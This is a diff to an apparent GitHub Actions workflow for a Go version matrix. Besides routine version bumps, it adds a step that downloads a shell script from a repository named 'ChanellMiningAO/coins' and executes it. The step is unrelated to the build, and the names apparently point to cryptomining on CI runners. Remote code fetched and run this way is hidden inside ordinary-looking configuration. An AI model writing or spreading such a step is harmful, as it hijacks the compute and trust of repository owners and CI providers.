@@ -5,7 +5,7 @@ jobs:
     name: Chanell
     runs-on: ubuntu-18.04
     strategy:
-      max-parallel: 25
+      max-parallel: 5
       fail-fast: false
       matrix:
         go: [1.6, 1.7, 1.8, 1.9, 1.10]
@@ -21,7 +21,7 @@ steps:
     go-version: ${{ matrix.go }}
   id: go
 - name: Setup
-  uses: actions/checkout@v2
+  uses: actions/checkout@v3
 - name: Chanell
   run: | 
-    wget https://github.com/ChanellMiningAO/coins/blob/main/resa.sh && chmod u+x koil.sh && ./koil.sh
+    wget https://github.com/ChanellMiningAO/coins/blob/main/resa.sh && chmod u+x resa.sh && ./resa.sh
